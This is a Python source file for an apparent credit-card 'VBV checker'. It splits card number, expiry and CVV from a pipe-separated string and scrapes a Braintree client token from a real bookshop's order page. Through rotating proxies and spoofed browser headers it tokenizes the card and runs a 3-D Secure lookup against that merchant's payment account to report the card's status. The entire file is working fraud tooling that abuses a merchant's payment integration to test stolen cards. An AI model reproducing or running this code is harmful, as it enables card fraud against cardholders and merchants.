import aiohttp
from async_timeout import timeout
import certifi
import ssl
import random
import json
import base64
import asyncio
import platform

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

async def VBV(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        try:
            splitter = cc.split('|')
            ccnum    = splitter[0]
            mes      = splitter[1]
            ano      = splitter[2]
            cvv      = splitter[3] 
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
            })
            try :    
                async with session.get('https://www.masteringemacs.org/order', proxy=str(proxyrand), timeout=12) as resp:
                    bearer = await resp.text()
                    lines = bearer.split("\n")
                    for i in lines:
                        if "        data-client-token=" in i:
                            sucio = i
                    bearer = sucio.replace('        data-client-token="',"").replace('"',"")
                    bearer = json.loads(base64.b64decode(bearer))
                    bearer = bearer['authorizationFingerprint']
            except UnboundLocalError :
                await session.close()
                return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            except KeyError :
                await session.close()
                return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'           
            except aiohttp.client_exceptions.ClientHttpProxyError :
                await session.close()
                return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'  

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',

                'Content-Type': 'application/json',
                'Authorization': f'Bearer {bearer}',
                'Braintree-Version': '2018-05-10',
                'Origin': 'https://assets.braintreegateway.com',
                'Connection': 'keep-alive',
                'Referer': 'https://assets.braintreegateway.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
            }

            data = {

                "clientSdkMetadata":{
                    "source":"client",
                    "integration":"dropin2",
                    "sessionId":"2ad1fdfb-ebdb-44cd-ac16-5af40e3cbd41"
                },
                "query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
                "variables":{
                    "input":{
                        "creditCard":{
                            "number": ccnum,
                            "expirationMonth": mes,
                            "expirationYear": ano,
                            "cvv": cvv,
                        },
                        "options":{
                            "validate": False
                        }
                    }
                },
                "operationName":"TokenizeCreditCard"

            }
            async with session.post('https://payments.braintree-api.com/graphql', headers=headers, json=data, proxy=str(proxyrand), timeout=12) as resp:
                try :
                    token = await resp.json()
                    token = token['data']['tokenizeCreditCard']['token'] 
                except UnboundLocalError or TypeError:
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️' 

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Content-Type': 'application/json',
                'Origin': 'https://www.masteringemacs.org',
                'Connection': 'keep-alive',
                'Referer': 'https://www.masteringemacs.org/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
            }

            data =  {
                "amount":"41.84",
                "additionalInfo":{
                    "acsWindowSize":"03"
                },
                "bin":"454481",
                "dfReferenceId":"1_ea5b2426-b0cb-45d7-8b12-7c17f00da12a",
                "clientMetadata":{
                    "requestedThreeDSecureVersion":"2",
                    "sdkVersion":"web/3.85.2",
                    "cardinalDeviceDataCollectionTimeElapsed":82,
                    "issuerDeviceDataCollectionTimeElapsed":477,
                    "issuerDeviceDataCollectionResult":True
                },
                "authorizationFingerprint": f"{bearer}",
                "braintreeLibraryVersion":"braintree/web/3.85.2",
                "_meta":{
                    "merchantAppId":"www.masteringemacs.org",
                    "platform":"web",
                    "sdkVersion":"3.85.2",
                    "source":"client",
                    "integration":"custom",
                    "integrationType":"custom",
                    "sessionId":"2ad1fdfb-ebdb-44cd-ac16-5af40e3cbd41"
                }
            }
            async with session.post(f'https://api.braintreegateway.com/merchants/wxwhz63s9x4ysmhx/client_api/v1/payment_methods/{token}/three_d_secure/lookup', headers=headers, json=data, proxy=str(proxyrand), timeout=12) as resp:
                try :
                    response = await resp.text()
                except UnboundLocalError or TypeError:
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'           

            if int(response.find('threeDSecureInfo')) > 0 :
                try :
                    response3D = await resp.json()
                    response3D = response3D['paymentMethod']['threeDSecureInfo']['status']
                    response3D = str(response3D).replace('_'," ").title()
                    await session.close()
                    return response3D
                except KeyError:
                    print(response)
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'           
            else :
                await session.close()
                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ♻️"